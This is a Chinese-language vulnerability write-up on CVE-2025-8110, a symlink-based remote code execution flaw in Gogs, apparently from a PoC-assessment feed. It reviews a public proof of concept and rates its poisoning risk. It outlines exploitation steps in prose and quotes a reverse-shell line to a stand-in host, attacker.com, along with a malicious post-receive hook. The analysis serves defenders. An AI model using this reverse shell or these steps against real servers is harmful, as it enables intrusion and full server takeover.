## CVE-2025-8110 - Gogs 远程命令注入 (Remote Command Injection) / 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程命令注入 (Remote Command Injection) / 远程代码执行 (RCE)

**影响应用:** Gogs

**危害等级:** 高危

**CVSS评分:** 7.8 (CVSS v3.1)

**影响版本:** prior to 0.13.0

**利用条件:** 需要认证 (Authenticated access to a repository with push permissions)

**POC 可用性:** 6/10

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-8110是一个影响Gogs自托管Git服务的严重远程代码执行漏洞。该漏洞的根源在于Gogs对符号链接（Symbolic Link）的处理不当，导致攻击者能够绕过先前CVE-2024-55947的安全修复。具体来说，当Gogs服务器处理用户提交的Git仓库时，未能正确地对包含恶意符号链接的文件路径进行过滤和校验。攻击者可以利用这一缺陷，通过精心构造一个包含符号链接的Git仓库，欺骗Gogs服务器将其中的文件内容写入到仓库目录之外的任意位置。这为攻击者提供了任意文件写入的能力，进而能够覆盖系统上的关键文件，例如SSH密钥文件，或者更直接地，在服务器上创建或修改Git钩子（Git Hooks）。一旦恶意Git钩子（如`post-receive`）被成功植入并具有可执行权限，后续的Git操作（如再次推送代码）将触发这些钩子执行，从而实现远程命令执行（RCE），完全控制受害服务器。此漏洞已被监测到在野外有活跃利用的报告，导致超过700个公网暴露的Gogs实例遭到攻陷，凸显了其高危性。

**POC有效性分析**：
提供的POC代码由`README.md`、`bash.sh`和`exploit.py`三个文件组成。
- `README.md`简要说明了受影响的软件、漏洞类型和描述，清晰明了。
- `bash.sh`是一个恶意`post-receive`钩子的示例，它包含了注入一个反向Shell的命令（`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`）。这是一个典型的RCE payload，用于建立与攻击者控制的服务器的连接。
- `exploit.py`是POC的主要执行脚本。它模拟了在本地文件系统上创建一个恶意仓库，并在其中植入一个`post-receive`钩子。这个钩子的内容是一个简单的命令`id > /tmp/gogs_exploited`，用于验证命令执行。脚本通过`os.makedirs`创建目录，`with open`写入钩子内容，并通过`subprocess.run(["chmod", "+x", ...])`赋予其可执行权限。
该POC的有效性在于，它清晰地演示了如果攻击者能够将恶意Git钩子植入Gogs服务器的`.git/hooks/`目录并使其可执行，那么远程代码执行将成功发生。然而，需要注意的是，该POC本身并未实现完整的端到端攻击链。它没有包含认证到Gogs实例、创建远程仓库、以及利用符号链接绕过机制将钩子上传到Gogs服务器的逻辑。它仅仅展示了攻击的最后阶段——恶意钩子的植入和执行。因此，它是一个概念验证（PoC），需要防御者自行补充前置步骤以进行全面的复现和测试。

**利用步骤**：
要利用CVE-2025-8110，攻击者通常需要执行以下步骤：
1.  **获取认证凭据**：攻击者需要拥有一个Gogs实例上的有效用户账户，并具有创建或推送代码到仓库的权限。
2.  **构造恶意仓库**：攻击者在本地初始化一个Git仓库。根据漏洞描述，需要利用符号链接绕过机制，精心构造仓库内容，使得Gogs在处理时，会将恶意文件（即Git钩子）写入到目标服务器上的特定位置（例如某个仓库的`.git/hooks/post-receive`）。这意味着攻击者可能需要创建指向`.git/hooks/post-receive`的符号链接，并确保其指向内容是恶意脚本。
3.  **植入恶意Git钩子**：将预先准备好的恶意Shell脚本（如POC中的`bash.sh`内容或`id > /tmp/gogs_exploited`）作为`post-receive`钩子的内容。
4.  **推送到Gogs服务器**：攻击者将构造好的恶意仓库推送到Gogs服务器上。Gogs服务器在处理这个推送请求时，由于符号链接处理不当，会将恶意钩子写入到指定的目标路径，并使其具有可执行权限。
5.  **触发RCE**：一旦恶意钩子被成功植入，攻击者通过执行任何能触发`post-receive`钩子的Git操作（例如再次向同一仓库推送一次空白提交），即可在Gogs服务器上执行恶意钩子中的代码，从而实现远程命令执行。

**投毒风险分析**：
对提供的POC代码进行分析，其投毒风险评估为低（10%）。主要原因如下：
-   **代码透明性高**：`exploit.py`和`bash.sh`的代码量小，逻辑清晰，没有使用任何形式的代码混淆。所有的操作，如文件创建、权限修改和命令执行，都直接在代码中明文显示，易于审计和理解。
-   **无外部依赖或网络请求**：POC代码没有引入任何外部库或模块，也没有在执行过程中发起任何对外部网络资源的下载或通信请求（除了`bash.sh`中作为恶意payload一部分的反向Shell连接）。这意味着POC本身不会从不可信的源下载额外的恶意组件。
-   **恶意行为是显式示范**：`bash.sh`中包含的反向Shell命令，以及`exploit.py`中`id > /tmp/gogs_exploited`的命令，是作为漏洞利用的明确示例存在的。它们是POC旨在演示的“恶意”行为，而非隐藏的、额外附加的投毒行为。防御性安全研究人员在复现时，会清楚地知道这些是预期中的利用payload，而非POC作者植入的后门。
-   **本地模拟为主**：`exploit.py`主要在本地文件系统上模拟钩子的创建和权限设置，不直接与远程Gogs服务器交互。这进一步降低了在测试过程中意外触发表外恶意行为的风险。
-   **无加密或编码**：代码中没有发现任何加密、Base64编码或其他旨在隐藏真实意图的编码技术。

综上所述，该POC的代码质量较高，透明度好，其演示的恶意行为是明确且可控的。因此，在合理谨慎地审查和隔离环境下执行的前提下，使用此POC进行防御性测试的投毒风险非常低。防御者可以放心地分析和复现该漏洞，以增强对Gogs环境的防护能力。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
